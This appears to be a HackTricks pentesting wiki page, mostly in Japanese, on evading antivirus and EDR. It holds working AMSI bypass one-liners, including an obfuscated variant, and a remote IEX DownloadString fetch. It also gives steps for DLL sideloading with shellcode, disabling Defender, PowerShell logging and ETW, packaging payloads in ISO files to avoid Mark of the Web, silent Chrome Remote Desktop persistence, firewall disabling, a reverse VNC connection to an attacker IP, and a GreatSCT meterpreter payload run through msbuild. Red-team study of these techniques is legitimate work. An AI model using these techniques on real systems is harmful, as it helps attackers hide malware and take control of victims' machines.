# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**このページは** [**@m2rc_p**](https://twitter.com/m2rc_p)**によって書かれました！**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defenderの動作を停止するツール。
- [no-defender](https://github.com/es3n1n/no-defender): 別のAVを偽装してWindows Defenderの動作を停止するツール。
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV回避の方法論**

現在、AVはファイルが悪意あるかどうかを判定するために、静的検出、動的解析、そしてより高度なEDRでは振る舞い解析といった異なる手法を使用しています。

### **静的検出**

静的検出は、バイナリやスクリプト内の既知の悪意ある文字列やバイト配列をフラグにしたり、ファイル自体から情報（例えば file description、company name、digital signatures、icon、checksum など）を抽出することで行われます。つまり、既知の公開ツールを使うと検出されやすくなる可能性が高いということです。こうした検出を回避する方法はいくつかあります：

- **Encryption**

バイナリを暗号化すればAVにプログラムを検出される手段はなくなりますが、プログラムをメモリ上で復号して実行するためのローダーが必要になります。

- **Obfuscation**

時にはバイナリやスクリプト内のいくつかの文字列を変更するだけでAVをやり過ごせますが、何を難読化するかによっては時間がかかることがあります。

- **Custom tooling**

独自のツールを開発すれば既知の悪質なシグネチャは存在しませんが、それには多くの時間と労力がかかります。

> [!TIP]
> Windows Defenderの静的検出を確認する良い方法は[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)です。ThreatCheckはファイルを複数のセグメントに分割し、Defenderに各セグメントを個別にスキャンさせることで、バイナリ内でフラグされている正確な文字列やバイトを特定できます。

実践的なAV回避についてはこの[YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)を強くおすすめします。

### **動的解析**

動的解析は、AVがバイナリをサンドボックスで実行し、ブラウザのパスワードを復号して読む、LSASSのミニダンプを行うなどの悪意ある活動を監視する場合を指します。ここはやや扱いが難しいですが、サンドボックスを回避するためにできることをいくつか紹介します。

- **Sleep before execution** 実行前にsleepすることは、実装方法によってはAVの動的解析を回避する良い手段になり得ます。AVはユーザーの作業を妨げないようファイルスキャンに非常に短い時間しか割けないため、長いsleepを使うと解析が妨げられることがあります。ただし、多くのAVのサンドボックスは実装次第でsleepをスキップすることがある点に注意してください。
- **Checking machine's resources** 通常、サンドボックスは利用できるリソースが非常に少ない（例: < 2GB RAM）ため、リソースをチェックするのは有効です。たとえばCPU温度やファンの回転数を確認するなど創造的なチェックを行えば、サンドボックスでは実装されていない項目を利用できます。
- **Machine-specific checks** ターゲットが "contoso.local" ドメインに参加しているワークステーションであれば、コンピュータのドメインが指定したものと一致するかをチェックし、一致しなければプログラムを終了させる、といったことが可能です。

Microsoft DefenderのSandboxのcomputernameがHAL9THであることが判明しているため、デトネーション前にマルウェア内でコンピュータ名をチェックし、名前がHAL9THであればDefenderのサンドボックス内にいると判断してプログラムを終了させることができます。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>出典: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

サンドボックス対策についての他の非常に有用なヒントは、[@mgeeky](https://twitter.com/mariuszbit)によるものです。

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev チャンネル</p></figcaption></figure>

前述したように、**公開ツール**は最終的に**検出される**ようになります。そこで自分に問いかけてみてください：

例えばLSASSをダンプしたい場合、**本当にmimikatzを使う必要があるのか**？それともLSASSをダンプする別の、あまり知られていないプロジェクトを使えるのではないか？

正解はおそらく後者です。mimikatzを例に取ると、これはAVやEDRに最もフラグされやすいツールの一つであり、プロジェクト自体は素晴らしいですが、AVを回避するために扱うのは悪夢のような作業になります。したがって、達成したいことに対して代替手段を探すのが賢明です。

> [!TIP]
> ペイロードを回避目的で改変する際は、Defenderの自動サンプル送信をオフにすることを必ず行ってください。そして真面目な話、長期的に回避を達成したいのであれば、絶対にDO NOT UPLOAD TO VIRUSTOTALしてください。特定のAVでペイロードが検出されるか確認したい場合は、そのAVをVMにインストールし、自動サンプル送信をオフにして、満足する結果が得られるまでそこでテストしてください。

## EXEs vs DLLs

可能な限り、回避には常にDLLを優先してください。私の経験では、DLLファイルは通常、検出や解析がはるかに少ないため、ペイロードがDLLとして動作できる場合には検出を避けるための非常に単純で効果的なトリックになります。

この画像が示すように、HavocのDLLペイロードはantiscan.meで検出率が4/26であるのに対し、EXEペイロードは7/26の検出率でした。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.meによる通常の Havoc EXE ペイロードと通常の Havoc DLL の比較</p></figcaption></figure>

以下では、DLLファイルを使ってよりステルス性を高めるためのいくつかのトリックを紹介します。

## DLL Sideloading & Proxying

DLL Sideloadingは、ローダーが使用するDLL検索順を利用して、被害者アプリケーションと悪意あるペイロードを同一ディレクトリに配置することで成立します。

DLL Sideloadingに脆弱なプログラムは[Siofra](https://github.com/Cybereason/siofra)と以下のpowershellスクリプトで確認できます:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
このコマンドは、 "C:\Program Files\\" 内で DLL hijacking の影響を受けやすいプログラムの一覧と、それらがロードしようとする DLL ファイルを出力します。

私は、**DLL Hijackable/Sideloadable programs を自分で調査することを強く推奨します**。この技術は適切に行えばかなりステルスですが、公開されている既知の DLL Sideloadable programs を使うと簡単に検出される可能性があります。

プログラムが読み込むことを期待する名前の悪意ある DLL を配置するだけでは、ペイロードは実行されません。プログラムはその DLL 内に特定の関数を期待しているためです。この問題を解決するために、**DLL Proxying/Forwarding** と呼ばれる別の技術を使用します。

**DLL Proxying** は、プログラムがプロキシ（および悪意ある）DLL に対して行う呼び出しを元の DLL に転送します。これによりプログラムの機能を維持しつつ、ペイロードの実行を処理できます。

私は [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) プロジェクトを [@flangvik](https://twitter.com/Flangvik/) から使用します。

以下が私が従った手順です：
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
最後のコマンドは、DLL のソースコードテンプレートとリネームした元の DLL、合計2つのファイルを生成します。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

我々の shellcode（[SGN](https://github.com/EgeBalci/sgn) でエンコード）と proxy DLL は [antiscan.me](https://antiscan.me/) において検出率が 0/26 でした！これは成功と言えるでしょう。

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 私は [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) を DLL Sideloading に関して視聴することと、議論した内容をより深く学ぶために [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) も見ることを強くおすすめします。

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Freeze を使うと、shellcode を隠密にロードして実行できます。
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 回避はいたちごっこに過ぎません。今日有効でも明日には検知される可能性があるため、1つのツールだけに頼らないでください。可能なら複数の回避手法を組み合わせてください。

## AMSI (Anti-Malware Scan Interface)

AMSIは"[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)"を防ぐために作られました。初期のAVはディスク上のファイルのみをスキャンできたため、ペイロードをメモリ内で直接実行できれば、AVは視認性が不足して防ぐことができませんでした。

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

これは、スクリプトの内容を暗号化・難読化されていない形で公開することで、アンチウイルス製品がスクリプトの挙動を検査できるようにします。

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Notice how it prepends `amsi:` and then the path to the executable from which the script ran, in this case, powershell.exe

amsi: が先頭に付加され、続けてスクリプトを実行した実行ファイルのパス（この場合は powershell.exe）が付く点に注目してください。

We didn't drop any file to disk, but still got caught in-memory because of AMSI.

ファイルをディスクに落とさなくても、AMSIによりメモリ内で検知されてしまいました。

Moreover, starting with **.NET 4.8**, C# code is run through AMSI as well. This even affects `Assembly.Load(byte[])` to load in-memory execution. Thats why using lower versions of .NET (like 4.7.2 or below) is recommended for in-memory execution if you want to evade AMSI.

さらに、.NET 4.8 以降では C# コードも AMSI を経由して実行されます。これはメモリ内実行のための `Assembly.Load(byte[])` にも影響します。したがって、AMSI を回避したい場合は、メモリ内実行では .NET の古いバージョン（例: 4.7.2 以下）を使うことが推奨されます。

There are a couple of ways to get around AMSI:

- **Obfuscation**

Since AMSI mainly works with static detections, therefore, modifying the scripts you try to load can be a good way for evading detection.

However, AMSI has the capability of unobfuscating scripts even if it has multiple layers, so obfuscation could be a bad option depending on how it's done. This makes it not-so-straightforward to evade. Although, sometimes, all you need to do is change a couple of variable names and you'll be good, so it depends on how much something has been flagged.

AMSIは主に静的検出に基づいて動作するため、読み込もうとするスクリプトを変更することは検知回避の有効な手段になり得ます。ただし、AMSI は複数層の難読化でもスクリプトを難読解除できる能力があるため、どのように実施するかによっては obfuscation が逆効果になることがあります。そのため必ずしも単純ではありません。とはいえ、場合によっては変数名を数個変更するだけで回避できることもあるので、どれだけ検知フラグが付いているかによります。

- **AMSI Bypass**

Since AMSI is implemented by loading a DLL into the powershell (also cscript.exe, wscript.exe, etc.) process, it's possible to tamper with it easily even running as an unprivileged user. Due to this flaw in the implementation of AMSI, researchers have found multiple ways to evade AMSI scanning.

AMSIはDLLをpowershell（および cscript.exe、wscript.exe など）のプロセスにロードすることで実装されているため、権限の低いユーザーで実行していても簡単に改変できる可能性があります。このAMSIの実装上の欠陥により、研究者たちはAMSIスキャンを回避する複数の手法を見つけています。

**Forcing an Error**

Forcing the AMSI initialization to fail (amsiInitFailed) will result that no scan will be initiated for the current process. Originally this was disclosed by [Matt Graeber](https://twitter.com/mattifestation) and Microsoft has developed a signature to prevent wider usage.

AMSIの初期化を失敗させる（amsiInitFailed）と、現在のプロセスではスキャンが実行されなくなります。これは元々 Matt Graeber によって公開され、Microsoft はこれが広く使われるのを防ぐためのシグネチャを作成しました。
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
現在の powershell プロセスで AMSI を無効化するには、powershell のコード1行だけで十分だった。この行はもちろん AMSI 自身に検出されるため、この手法を利用するには何らかの修正が必要だ。

以下は私がこの [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) から取得した修正版の AMSI バイパスだ。
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

この手法は最初に [@RastaMouse](https://twitter.com/_RastaMouse/) によって発見されました。ユーザー入力をスキャンする amsi.dll の "AmsiScanBuffer" 関数のアドレスを見つけ、その関数を E_INVALIDARG を返すように上書きします。こうすることで実際のスキャン結果は 0 を返し、クリーンと解釈されます。

> [!TIP]
> 詳細については https://rastamouse.me/memory-patching-amsi-bypass/ をお読みください。

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

This tools [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Remove the detected signature**

現在のプロセスのメモリから検出された AMSI シグネチャを削除するには、**[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** や **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** といったツールを使用できます。これらのツールは、現在のプロセスのメモリ内で AMSI シグネチャをスキャンし、それを NOP 命令で上書きして実質的にメモリから削除します。

**AV/EDR products that uses AMSI**

AMSI を使用する AV/EDR 製品の一覧は **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** にあります。

**Use Powershell version 2**
If you use PowerShell version 2, AMSI will not be loaded, so you can run your scripts without being scanned by AMSI. You can do this:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging は、システム上で実行されたすべての PowerShell コマンドを記録できる機能です。監査やトラブルシューティングに便利ですが、検出を回避しようとする攻撃者にとっては大きな障害になります。

PowerShell logging を回避するために使える手法：

- **Disable PowerShell Transcription and Module Logging**: これを行うために [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) のようなツールを使用できます。
- **Use Powershell version 2**: PowerShell version 2 を使用すると AMSI がロードされないため、AMSI によるスキャン無しでスクリプトを実行できます。例: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: 防御機能のない powershell を生成するには [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) を使用します（これは Cobalt Strike の powerpick が使っている方法です）。

## Obfuscation

> [!TIP]
> いくつかの難読化手法はデータを暗号化することに依存しており、これによりバイナリのエントロピーが増加し、AVs や EDRs に検出されやすくなります。これに注意し、暗号化は機密性の高い部分や隠す必要のある特定のセクションにのみ適用することを検討してください。

### Deobfuscating ConfuserEx-Protected .NET Binaries

ConfuserEx 2（または商用フォーク）を使ったマルウェアを解析する際、デコンパイラやサンドボックスを妨げる複数の保護層に遭遇することがよくあります。以下のワークフローは、ほぼ元の IL を復元し、その後 dnSpy や ILSpy などのツールで C# にデコンパイルできる状態に戻すのに信頼できます。

1.  Anti-tampering removal – ConfuserEx はすべての *method body* を暗号化し、*module* の static コンストラクタ（`<Module>.cctor`）内で復号します。これにより PE チェックサムもパッチされ、修正するとバイナリがクラッシュします。暗号化されたメタデータテーブルを特定し、XOR キーを回復してクリーンなアセンブリを書き換えるには **AntiTamperKiller** を使用します:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
出力には 6 つの anti-tamper パラメータ（`key0-key3`, `nameHash`, `internKey`）が含まれ、独自のアンパッカーを作る際に有用です。

2.  Symbol / control-flow recovery – *clean* ファイルを **de4dot-cex**（ConfuserEx 対応の de4dot フォーク）に渡します。
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
フラグ:
• `-p crx` – ConfuserEx 2 プロファイルを選択  
• de4dot はコントロールフローのフラット化を元に戻し、元の namespace、class、変数名を復元し、定数文字列を復号します。

3.  Proxy-call stripping – ConfuserEx はデコンパイルをさらに困難にするために直接のメソッド呼び出しを軽量ラッパー（いわゆる *proxy calls*）に置き換えます。これらは **ProxyCall-Remover** で削除します:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
このステップの後、`Class8.smethod_10` のような不透明なラッパー関数の代わりに `Convert.FromBase64String` や `AES.Create()` などの通常の .NET API が見えるようになるはずです。

4.  Manual clean-up – 得られたバイナリを dnSpy で開き、大きな Base64 ブロブや `RijndaelManaged`/`TripleDESCryptoServiceProvider` の使用箇所を検索して *実際の* ペイロードを見つけます。マルウェアはしばしば `<Module>.byte_0` の中で TLV エンコードされたバイト配列として初期化して格納しています。

上のチェーンは悪意あるサンプルを実行せずに実行フローを復元するため、オフライン作業時に便利です。

> 🛈  ConfuserEx は `ConfusedByAttribute` というカスタム属性を生成します。これはサンプルを自動的に仕分ける IOC として利用できます。

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): このプロジェクトの目的は、[LLVM](http://www.llvm.org/) コンパイルスイートのオープンソースフォークを提供し、[code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) や改ざん防止によってソフトウェアのセキュリティを向上させることです。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator は `C++11/14` を利用して、外部ツールやコンパイラの変更を使わずにコンパイル時に obfuscated code を生成する方法を示します。
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework によって生成される obfuscated operations のレイヤを追加し、アプリケーションを解析しようとする人物の作業を少しだけ難しくします。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz は x64 binary obfuscator で、.exe、.dll、.sys を含むさまざまな pe files を obfuscate できます。
- [**metame**](https://github.com/a0rtega/metame): Metame は任意の実行ファイル向けのシンプルな metamorphic code engine です。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator は ROP (return-oriented programming) を使用する LLVM-supported languages 向けの細粒度な code obfuscation framework です。ROPfuscator は通常の命令を ROP chains に変換することでアセンブリレベルでプログラムを obfuscate し、通常の制御フローの認識を妨げます。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt は Nim で書かれた .NET PE Crypter です
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor は既存の EXE/DLL を shellcode に変換してロードすることができます

## SmartScreen & MoTW

インターネットから実行ファイルをダウンロードして実行したときに、この画面を見たことがあるかもしれません。

Microsoft Defender SmartScreen は、エンドユーザーが潜在的に悪意のあるアプリケーションを実行するのを防ぐことを目的としたセキュリティ機構です。

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen は主にレピュテーションベースのアプローチで動作します。つまり、あまりダウンロードされていないアプリケーションは SmartScreen をトリガーし、ファイルの実行を警告・防止します（ただしファイルは More Info -> Run anyway をクリックすることで実行可能です）。

**MoTW** (Mark of The Web) は Zone.Identifier という名前の [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) で、インターネットからファイルをダウンロードした際にダウンロード元の URL とともに自動的に作成されます。

<figure><img src="../images/image (237).png" alt=""><figcaption><p>インターネットからダウンロードしたファイルの Zone.Identifier ADS を確認しています。</p></figcaption></figure>

> [!TIP]
> 実行ファイルが **trusted** な署名証明書で署名されている場合、**won't trigger SmartScreen** という点に注意してください。

payloads が Mark of The Web を取得するのを防ぐ非常に効果的な方法は、ISO のようなコンテナにパッケージングすることです。これは Mark-of-the-Web (MOTW) が **non NTFS** ボリュームには適用**できない**ためです。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) は、payloads を出力コンテナにパッケージして Mark-of-the-Web を回避するツールです。

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) は、Windows における強力なロギング機構で、アプリケーションやシステムコンポーネントが **イベントを記録** することを可能にします。ただし、セキュリティ製品が悪意ある活動を監視・検出するためにも利用され得ます。

AMSI を無効化（バイパス）する方法と同様に、ユーザー空間プロセスの **`EtwEventWrite`** 関数をイベントを記録せずに即座に戻すようにすることも可能です。これは関数をメモリ上でパッチして即座に戻るようにすることで行い、そのプロセスに対する ETW ロギングを事実上無効化します。

詳しくは **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** を参照してください。


## C# Assembly Reflection

C# バイナリをメモリ上にロードする手法は以前から知られており、AV に検知されずにポストエクスプロイトのツールを実行する非常に有効な方法です。

ペイロードがディスクに触れず直接メモリにロードされるため、プロセス全体に対して AMSI をパッチすることだけを考慮すればよいことになります。

ほとんどの C2 フレームワーク（sliver, Covenant, metasploit, CobaltStrike, Havoc など）はすでに C# アセンブリをメモリ上で直接実行する機能を提供していますが、その実行方法にはいくつかのやり方があります:

- **Fork\&Run**

これは、**新しい生贄プロセスを生成する（spawning a new sacrificial process）** ことで、その新プロセスにポストエクスプロイトの悪意あるコードを注入・実行し、終了後にそのプロセスを殺す手法です。利点と欠点があります。利点は実行が我々の Beacon implant プロセスの **外部** で行われることです。つまり、ポストエクスプロイト中に何か問題が起きたり検知されても、我々の **implant が生き残る** 可能性が **大幅に高く** なります。欠点は **Behavioural Detections** に引っかかる可能性が **高くなる** ことです。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

これはポストエクスプロイトの悪意あるコードを **自身のプロセス内に注入する（into its own process）** 方法です。こうすることで新しいプロセスを作成して AV にスキャンされることを避けられますが、ペイロード実行中に問題が起きた場合、プロセスがクラッシュして **beacon を失う（losing your beacon）** 可能性が **大幅に高く（much greater chance）** なります。

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# アセンブリのロードについてもっと読みたい場合は、この記事 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) と彼らの InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) を参照してください。

C# アセンブリは **PowerShell から** もロードできます。Invoke-SharpLoader (https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) と S3cur3th1sSh1t のビデオ (https://www.youtube.com/watch?v=oe11Q-3Akuk) をチェックしてください。

## Using Other Programming Languages

提案されているように [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins)、攻撃者が管理する SMB 共有にインストールされたインタプリタ環境へのアクセスを侵害されたマシンに与えることで、他の言語を使って悪意あるコードを実行することが可能です。

SMB 共有上のインタプリタバイナリと環境へのアクセスを許可することで、侵害されたマシンのメモリ内でこれらの言語による **任意コードを実行** できます。

リポジトリによれば、Defender はスクリプトをスキャンし続けますが、Go, Java, PHP などを利用することで**静的シグネチャのバイパスに対する柔軟性が高まる** とあります。これらの言語でのランダムな難読化されていないリバースシェルスクリプトでのテストは成功しています。

## TokenStomping

Token stomping は、攻撃者が **アクセス トークンや EDR や AV のようなセキュリティ製品を操作する（manipulate the access token or a security produit like an EDR or AV）** 技術で、プロセスを停止させることなく権限を削減し、悪意ある活動を検査する権限を持たせないようにできます。

これを防ぐために、Windows はセキュリティプロセスのトークンに対して外部プロセスがハンドルを取得することを **防止** できるでしょう。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

この [**blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) にあるように、被害者の PC に Chrome Remote Desktop を展開して乗っ取りや永続化に使うのは簡単です:
1. https://remotedesktop.google.com/ からダウンロードし、"Set up via SSH" をクリックしてから、Windows 用の MSI ファイルをクリックしてダウンロードします。
2. 被害者側でサイレントインストールを実行します（管理者権限が必要）: `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop ページに戻って Next をクリックします。ウィザードが認証を求めるので、続行するには Authorize ボタンをクリックします。
4. 指定されたパラメータをいくつか調整して実行します: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111`（注: pin パラメータにより GUI を使わずにピンを設定できます。）

## Advanced Evasion

Evasion は非常に複雑なトピックで、単一のシステム内でも多くの異なるテレメトリソースを考慮する必要があるため、成熟した環境で完全に検知されずにいることはほぼ不可能です。

攻撃対象の各環境はそれぞれ強みと弱みを持ちます。

より高度な Evasion 技術に触れるために、[@ATTL4S](https://twitter.com/DaniLJ94) のこの講演を見ることを強くお勧めします。


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

これはまた、[@mariuszbit](https://twitter.com/mariuszbit) による Evasion in Depth に関する素晴らしい講演です。


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Defender が悪意ありと判定する部分を確認する**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) を使うと、バイナリの部分を段階的に **削除して** Defender がどの部分を悪意ありと判定するかを突き止めて分割してくれます。\
同様のことを行うツールに [**avred**](https://github.com/dobin/avred) があり、ウェブでサービスを提供しているのは [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) です。

### **Telnet Server**

Windows10 までは、すべての Windows に **Telnet server** を管理者としてインストールできる機能が付属していました。インストールは以下のように行います:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
システム起動時にそれを**開始**させ、今すぐ**実行**してください：
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet port** (stealth) を変更し、ファイアウォールを無効化:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (you want the bin downloads, not the setup)

**ON THE HOST**: _**winvnc.exe**_ を実行してサーバを設定する:

- オプション _Disable TrayIcon_ を有効にする
- _VNC Password_ にパスワードを設定する
- _View-Only Password_ にパスワードを設定する

その後、バイナリ _**winvnc.exe**_ と **新しく** 作成されたファイル _**UltraVNC.ini**_ を **victim** 内に移動する

#### **Reverse connection**

**attacker** は **host** 上で `vncviewer.exe -listen 5900` を実行し、reverse **VNC connection** を受け取る準備をしておく。次に **victim** 側で: winvnc デーモンを `winvnc.exe -run` で起動し、`winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` を実行する

**WARNING:** ステルスを維持するために以下のことは行わないこと

- 既に実行中のときに `winvnc` を起動しない（[popup](https://i.imgur.com/1SROTTl.png) が表示される）。実行中かは `tasklist | findstr winvnc` で確認する
- 同じディレクトリに `UltraVNC.ini` がない状態で `winvnc` を起動しない（[設定ウィンドウ](https://i.imgur.com/rfMQWcf.png) が開いてしまう）
- ヘルプ表示のために `winvnc -h` を実行しない（[popup](https://i.imgur.com/oc18wcu.png) が表示される）

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCTの内部:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
次に、`msfconsole -r file.rc` で **lister を起動** し、以下の方法で **xml payload** を **実行** します:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
